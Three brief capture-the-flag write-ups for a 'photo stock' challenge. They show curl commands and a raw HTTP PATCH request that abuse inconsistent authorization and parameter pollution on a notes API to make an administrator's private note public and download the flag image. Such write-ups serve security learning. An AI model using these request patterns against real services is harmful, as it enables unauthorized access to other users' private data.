# Writeup 1
photo stock
found the seed data showing admin user "administrator" with note "mvp_note"
login and see notes and found admin's note ID: b75c4dcf-ef7a-48db-be16-3bdc4017367d with status: "privacy":"private"then create own noteexploit inconsistent authorization logic
```
curl -X PATCH 'https://[target]/api/notes/public?id=b75c4dcf-ef7a-48db-be16-3bdc4017367d' \
  -H 'Authorization: Bearer [token]' \
  -d '["<own_note_id>"]'
```

    access flag
```
curl -H "Authorization: Bearer [token]" \
  https://[target]/api/notes/b75c4dcf-ef7a-48db-be16-3bdc4017367d/image \
  --output flag.jpg
```

# Writeup 2
photo stock (another solution)
Parameter pollution 
71c7dd2c-d4af-4bc5-ade4-f3c94c61a961 - private, 245e2cb8-dd1a-4e87-a647-64e92cb98a6c - public

```
PATCH /api/notes/public?id=71c7dd2c-d4af-4bc5-ade4-f3c94c61a961 HTTP/1.1 
Host: 127.0.0.1:9999 
Content-Length: 79 
Authorization: Bearer *
Accept-Language: en-GB,en;q=0.9 
sec-ch-ua: "Chromium";v="139", "Not;A=Brand";v="99" 
Content-Type: application/json 

["245e2cb8-dd1a-4e87-a647-64e92cb98a6c","245e2cb8-dd1a-4e87-a647-64e92cb98a6c"]
```


# Writeup 3
photo stock 
```
curl -s -X PATCH "https://target/api/notes/public" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data "{\"_json\":[],\"id\":\"$ID\"}" -i
```
